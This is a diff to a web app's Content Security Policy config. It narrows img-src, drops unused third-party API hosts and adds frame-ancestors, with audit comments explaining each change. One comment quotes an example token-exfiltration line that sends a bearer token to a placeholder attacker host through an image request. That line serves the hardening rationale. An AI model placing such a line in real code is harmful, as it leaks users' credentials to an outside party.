@@ -23,9 +23,36 @@ customHeaders:
 
       # ── Content Security Policy ───────────────────────────────────────────
       # Allows: Stripe (payments), Vimeo (landing video), Google Fonts,
-      # QuickBooks/Xero/Wave/FreshBooks APIs, Web3Forms (contact form),
       # Mailchimp (newsletter), app.taxstat360.com (backend API), and the Meta
       # (Facebook) advertising pixel.
+      #
+      # AUDIT M8 (second launch audit, Sep 2026) — three changes:
+      #
+      #   1. img-src was `'self' data: https: blob:`. The bare `https:` permitted ANY
+      #      https host, which is an open exfiltration channel for any script that does
+      #      manage to execute: `new Image().src = 'https://attacker/' + token` needs no
+      #      fetch and no CORS. That is the exfil half of H5, whose bearer token is
+      #      readable from JS. A repo-wide scan found NO <img src="https://..."> anywhere
+      #      — the external hosts in the codebase (irs.gov, engineeredtaxservices.com,
+      #      repsrecord.com) are anchor hrefs, not images — so the only external image
+      #      needed is the Meta pixel's beacon at www.facebook.com/tr.
+      #
+      #   2. Five connect-src hosts removed: quickbooks.api.intuit.com, api.xero.com,
+      #      api.wave.com, api.freshbooks.com and api.web3forms.com. Provider OAuth moved
+      #      server-side and the web3forms key moved behind POST /alerts/form-relay (see
+      #      integrations.js, OBS-5 RESOLVED). Zero references remain to any of the five
+      #      in src/ or index.html. Each was a permitted destination bought for nothing.
+      #
+      #   3. frame-ancestors 'none' added — it was absent entirely. X-Frame-Options: DENY
+      #      above covers legacy browsers; frame-ancestors is the CSP-era equivalent and
+      #      is what modern browsers actually honour.
+      #
+      # NOT done here, deliberately: violation reporting. The finding attributes the
+      # September CSP outage to its absence, but reporting would not have caught that —
+      # a dropped header produces no violations to report, because there is no policy.
+      # What catches absence is asserting the LIVE response (H13). Reporting is still
+      # worth adding, and needs a backend endpoint to receive the reports; it is an
+      # owner decision, not a config edit.
       #
       # FIX (fresh-pass audit, Aug 2026): the Meta Pixel (index.html's deferred,
       # consent-gated loader -- see pixelConsent.test.js) loads
@@ -79,21 +106,17 @@ customHeaders:
           script-src 'self' 'sha256-+Ls5J8NpLnwIUxzK4UCD1XQL3KuCQA5AeIFOO5iGoLk=' https://js.stripe.com https://connect.facebook.net;
           style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
           font-src 'self' https://fonts.gstatic.com;
-          img-src 'self' data: https: blob:;
+          img-src 'self' data: blob: https://www.facebook.com;
           connect-src 'self'
           https://app.taxstat360.com
           wss://app.taxstat360.com
           https://api.stripe.com
-          https://quickbooks.api.intuit.com
-          https://api.xero.com
-          https://api.wave.com
-          https://api.freshbooks.com
-          https://api.web3forms.com
           https://taxstat360.us4.list-manage.com
           https://www.facebook.com
           https://connect.facebook.net;
           frame-src https://js.stripe.com https://hooks.stripe.com https://player.vimeo.com;
           worker-src 'self' blob:;
+          frame-ancestors 'none';
           object-src 'none';
           base-uri 'self';
           form-action 'self' https://app.taxstat360.com https://taxstat360.us4.list-manage.com;
